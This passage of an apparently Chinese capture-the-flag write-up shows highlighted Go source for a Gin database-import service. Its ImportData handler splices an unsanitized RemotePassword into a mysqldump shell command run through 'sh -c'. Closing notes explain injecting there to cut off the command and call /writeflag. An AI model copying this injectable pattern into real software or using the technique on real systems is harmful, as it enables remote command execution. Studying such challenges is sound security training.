manager.mu.Unlock()<br><br><span class="hljs-keyword">if</span> manager.db == <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No active connection&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> _, err := manager.db.Exec(<span class="hljs-string">&quot;USE `&quot;</span> + dbName + <span class="hljs-string">&quot;`&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to switch database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>rows, err := manager.db.Query(<span class="hljs-string">&quot;SHOW TABLES&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to fetch tables: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> rows.Close()<br><br><span class="hljs-keyword">var</span> tables []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> rows.Next() &#123;<br><span class="hljs-keyword">var</span> tableName <span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> err := rows.Scan(&amp;tableName); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to scan table name: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br>tables = <span class="hljs-built_in">append</span>(tables, tableName)<br>&#125;<br><br>c.JSON(http.StatusOK, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;data&quot;</span>:    tables,<br>&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getTableData</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>dbName := c.Query(<span class="hljs-string">&quot;database&quot;</span>)<br>tableName := c.Query(<span class="hljs-string">&quot;table&quot;</span>)<br>page := c.DefaultQuery(<span class="hljs-string">&quot;page&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>)<br>size := c.DefaultQuery(<span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>)<br><br><span class="hljs-keyword">if</span> dbName == <span class="hljs-string">&quot;&quot;</span> || tableName == <span class="hljs-string">&quot;&quot;</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Database and table names are required&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>manager.mu.Lock()<br><span class="hljs-keyword">defer</span> manager.mu.Unlock()<br><br><span class="hljs-keyword">if</span> manager.db == <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No active connection&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> _, err := manager.db.Exec(fmt.Sprintf(<span class="hljs-string">&quot;USE `%s`&quot;</span>, dbName)); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to switch database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>columns, err := getTableColumns(manager.db, tableName)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to get table structure: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">var</span> total <span class="hljs-type">int</span><br>sumQuery := fmt.Sprintf(<span class="hljs-string">&quot;SELECT COUNT(*) FROM `%s`.`%s`&quot;</span>, dbName, tableName)<br><span class="hljs-keyword">if</span> err := manager.db.QueryRow(sumQuery).Scan(&amp;total); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to get total count: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">var</span> query <span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> page != <span class="hljs-string">&quot;0&quot;</span> &amp;&amp; size != <span class="hljs-string">&quot;0&quot;</span> &#123;<br>pageNum, err1 := strconv.Atoi(page)<br>pageSize, err2 := strconv.Atoi(size)<br><span class="hljs-keyword">if</span> err1 != <span class="hljs-literal">nil</span> || err2 != <span class="hljs-literal">nil</span> || pageNum &lt; <span class="hljs-number">1</span> || pageSize &lt; <span class="hljs-number">1</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid page or size parameter&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>offset := (pageNum - <span class="hljs-number">1</span>) * pageSize<br>query = fmt.Sprintf(<span class="hljs-string">&quot;SELECT * FROM `%s`.`%s` LIMIT %d OFFSET %d&quot;</span>,<br>dbName, tableName, pageSize, offset)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>query = fmt.Sprintf(<span class="hljs-string">&quot;SELECT * FROM `%s`.`%s` LIMIT 10&quot;</span>, dbName, tableName)<br>&#125;<br><br>rows, err := manager.db.Query(query)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to fetch data: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> rows.Close()<br><br><span class="hljs-keyword">var</span> results []<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;<br><span class="hljs-keyword">for</span> rows.Next() &#123;<br>values := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-built_in">len</span>(columns))<br>valuePtrs := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-built_in">len</span>(columns))<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> columns &#123;<br>valuePtrs[i] = &amp;values[i]<br>&#125;<br><br><span class="hljs-keyword">if</span> err := rows.Scan(valuePtrs...); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to scan row: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>row := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)<br><span class="hljs-keyword">for</span> i, col := <span class="hljs-keyword">range</span> columns &#123;<br>val := values[i]<br><span class="hljs-keyword">if</span> b, ok := val.([]<span class="hljs-type">byte</span>); ok &#123;<br>row[col] = <span class="hljs-type">string</span>(b)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>row[col] = val<br>&#125;<br>&#125;<br>results = <span class="hljs-built_in">append</span>(results, row)<br>&#125;<br><br><span class="hljs-keyword">if</span> err = rows.Err(); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Error iterating rows: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.JSON(http.StatusOK, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;data&quot;</span>: gin.H&#123;<br><span class="hljs-string">&quot;records&quot;</span>: results,<br><span class="hljs-string">&quot;total&quot;</span>:   total,<br>&#125;,<br>&#125;)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getTableColumns</span><span class="hljs-params">(db *sql.DB, tableName <span class="hljs-type">string</span>)</span></span> ([]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>rows, err := db.Query(<span class="hljs-string">&quot;SHOW COLUMNS FROM `&quot;</span> + tableName + <span class="hljs-string">&quot;`&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">defer</span> rows.Close()<br><br><span class="hljs-keyword">var</span> columns []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> rows.Next() &#123;<br><span class="hljs-keyword">var</span> field, typ, null, key, default_value, extra sql.NullString<br><span class="hljs-keyword">if</span> err := rows.Scan(&amp;field, &amp;typ, &amp;null, &amp;key, &amp;default_value, &amp;extra); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>columns = <span class="hljs-built_in">append</span>(columns, field.String)<br>&#125;<br><br><span class="hljs-keyword">if</span> err = rows.Err(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-keyword">return</span> columns, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">createDatabase</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>databaseName := c.Query(<span class="hljs-string">&quot;db&quot;</span>)<br>query := fmt.Sprintf(<span class="hljs-string">&quot;CREATE DATABASE IF NOT EXISTS `%s`&quot;</span>, databaseName)<br>_, err := manager.db.Exec(query)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusOK, gin.H&#123;<span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-string">&quot;false&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: err&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.JSON(http.StatusOK, gin.H&#123;<span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;创建数据库&quot;</span> + databaseName + <span class="hljs-string">&quot;成功&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">createdb</span><span class="hljs-params">(dbname <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>query := fmt.Sprintf(<span class="hljs-string">&quot;CREATE DATABASE IF NOT EXISTS `%s`&quot;</span>, dbname)<br>_, err := manager.db.Exec(query)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">buildDSN</span><span class="hljs-params">(config DBConfig)</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> config.Username + <span class="hljs-string">&quot;:&quot;</span> + config.Password + <span class="hljs-string">&quot;@tcp(&quot;</span> + config.Host + <span class="hljs-string">&quot;:&quot;</span> + config.Port + <span class="hljs-string">&quot;)/&quot;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ImportData</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br><span class="hljs-keyword">var</span> config ImportConfig<br><span class="hljs-keyword">if</span> err := c.ShouldBindJSON(&amp;config); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid request body: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> err := validateImportConfig(config); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid input: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>config.RemoteHost = sanitizeInput(config.RemoteHost)<br>config.RemoteUsername = sanitizeInput(config.RemoteUsername)<br>config.RemoteDatabase = sanitizeInput(config.RemoteDatabase)<br>config.LocalDatabase = sanitizeInput(config.LocalDatabase)<br><span class="hljs-keyword">if</span> manager.db == <span class="hljs-literal">nil</span> &#123;<br>dsn := buildDSN(localConfig)<br>db, err := sql.Open(<span class="hljs-string">&quot;mysql&quot;</span>, dsn)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to connect to local database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> err := db.Ping(); err != <span class="hljs-literal">nil</span> &#123;<br>db.Close()<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to ping local database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>manager.db = db<br>&#125;<br><span class="hljs-keyword">if</span> err := createdb(config.LocalDatabase); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to create local database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">//Never able to inject shell commands,Hackers can&#x27;t use this,HaHa</span><br><span class="hljs-comment">//原题内容？在提示什么？</span><br><span class="hljs-comment">//下面为命令拼接，将会拼接出一条命令，来远程获取一个主机的mysql数据库的内容然后返回到当前主机上  </span><br>command := fmt.Sprintf(<span class="hljs-string">&quot;/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s&quot;</span>,<br>config.RemoteHost,<br>config.RemoteUsername,<br>config.RemotePassword,<br>config.RemoteDatabase,<br>localConfig.Username,<br>localConfig.Password,<br>config.LocalDatabase,<br>)<br>fmt.Println(command)<br>cmd := exec.Command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, command)  <span class="hljs-comment">//命令执行，这里可以知道后端是用sh来调用mysql的，造成注入风险  </span><br><span class="hljs-keyword">if</span> err := cmd.Run(); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to import data: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.JSON(http.StatusOK, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Data imported successfully&quot;</span>,<br>&#125;)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sanitizeInput</span><span class="hljs-params">(input <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;  <span class="hljs-comment">//waf的字典  </span><br>reg := regexp.MustCompile(<span class="hljs-string">`[;&amp;|&gt;&lt;\(\)\&#123;\&#125;\[\]\\`</span> + <span class="hljs-string">&quot;`&quot;</span> + <span class="hljs-string">`]`</span>)<br><span class="hljs-keyword">return</span> reg.ReplaceAllString(input, <span class="hljs-string">&quot;&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">searchTableData</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>dbName := c.Query(<span class="hljs-string">&quot;database&quot;</span>)<br>tableName := c.Query(<span class="hljs-string">&quot;table&quot;</span>)<br>keyword := c.Query(<span class="hljs-string">&quot;keyword&quot;</span>)<br>page := c.DefaultQuery(<span class="hljs-string">&quot;page&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>size := c.DefaultQuery(<span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>)<br><br><span class="hljs-keyword">if</span> dbName == <span class="hljs-string">&quot;&quot;</span> || tableName == <span class="hljs-string">&quot;&quot;</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Database and table names are required&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>manager.mu.Lock()<br><span class="hljs-keyword">defer</span> manager.mu.Unlock()<br><br><span class="hljs-keyword">if</span> manager.db == <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusBadRequest, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No active connection&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> _, err := manager.db.Exec(fmt.Sprintf(<span class="hljs-string">&quot;USE `%s`&quot;</span>, dbName)); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to switch database: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>columns, err := getTableColumns(manager.db, tableName)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to get table structure: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">var</span> whereClause <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> args []<span class="hljs-keyword">interface</span>&#123;&#125;<br><span class="hljs-keyword">if</span> keyword != <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">var</span> conditions []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> _, col := <span class="hljs-keyword">range</span> columns &#123;<br>conditions = <span class="hljs-built_in">append</span>(conditions, fmt.Sprintf(<span class="hljs-string">&quot;`%s` LIKE ?&quot;</span>, col))<br>args = <span class="hljs-built_in">append</span>(args, <span class="hljs-string">&quot;%&quot;</span>+keyword+<span class="hljs-string">&quot;%&quot;</span>)<br>&#125;<br>whereClause = <span class="hljs-string">&quot; WHERE &quot;</span> + strings.Join(conditions, <span class="hljs-string">&quot; OR &quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">var</span> total <span class="hljs-type">int</span><br>countQuery := fmt.Sprintf(<span class="hljs-string">&quot;SELECT COUNT(*) FROM `%s`%s&quot;</span>, tableName, whereClause)<br><span class="hljs-keyword">if</span> err := manager.db.QueryRow(countQuery, args...).Scan(&amp;total); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to get total count: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>pageNum, _ := strconv.Atoi(page)<br>pageSize, _ := strconv.Atoi(size)<br>offset := (pageNum - <span class="hljs-number">1</span>) * pageSize<br><br>query := fmt.Sprintf(<span class="hljs-string">&quot;SELECT * FROM `%s`%s LIMIT ? OFFSET ?&quot;</span>, tableName, whereClause)<br>args = <span class="hljs-built_in">append</span>(args, pageSize, offset)<br><br>rows, err := manager.db.Query(query, args...)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to fetch data: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> rows.Close()<br><br><span class="hljs-keyword">var</span> results []<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;<br><span class="hljs-keyword">for</span> rows.Next() &#123;<br>values := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-built_in">len</span>(columns))<br>valuePtrs := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-built_in">len</span>(columns))<br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> columns &#123;<br>valuePtrs[i] = &amp;values[i]<br>&#125;<br><br><span class="hljs-keyword">if</span> err := rows.Scan(valuePtrs...); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">false</span>,<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Failed to scan row: &quot;</span> + err.Error(),<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>row := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)<br><span class="hljs-keyword">for</span> i, col := <span class="hljs-keyword">range</span> columns &#123;<br>val := values[i]<br><span class="hljs-keyword">if</span> b, ok := val.([]<span class="hljs-type">byte</span>); ok &#123;<br>row[col] = <span class="hljs-type">string</span>(b)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>row[col] = val<br>&#125;<br>&#125;<br>results = <span class="hljs-built_in">append</span>(results, row)<br>&#125;<br><br>c.JSON(http.StatusOK, gin.H&#123;<br><span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">true</span>,<br><span class="hljs-string">&quot;data&quot;</span>: gin.H&#123;<br><span class="hljs-string">&quot;records&quot;</span>: results,<br><span class="hljs-string">&quot;total&quot;</span>:   total,<br>&#125;,<br>&#125;)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validateImportConfig</span><span class="hljs-params">(config ImportConfig)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">if</span> config.RemoteHost == <span class="hljs-string">&quot;&quot;</span> ||<br>config.RemoteUsername == <span class="hljs-string">&quot;&quot;</span> ||<br>config.RemoteDatabase == <span class="hljs-string">&quot;&quot;</span> ||<br>config.LocalDatabase == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;missing required fields&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">if</span> match, _ := regexp.MatchString(<span class="hljs-string">`^[a-zA-Z0-9\.\-]+$`</span>, config.RemoteHost); !match &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;invalid remote host&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">if</span> match, _ := regexp.MatchString(<span class="hljs-string">`^[a-zA-Z0-9_]+$`</span>, config.RemoteUsername); !match &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;invalid remote username&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">if</span> match, _ := regexp.MatchString(<span class="hljs-string">`^[a-zA-Z0-9_]+$`</span>, config.RemoteDatabase); !match &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;invalid remote database name&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">if</span> match, _ := regexp.MatchString(<span class="hljs-string">`^[a-zA-Z0-9_]+$`</span>, config.LocalDatabase); !match &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;invalid local database name&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>复现时平台无法下发赛题。<br>攻击思路，大概就是在RemotePassword里进行注入，应该就能直接rec，但是题目提示，环境内有&#x2F;writeflag命令能直接写到&#x2F;flag目录  </p><p>截断原命令,然后写&#x2F;writeflag即可：  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 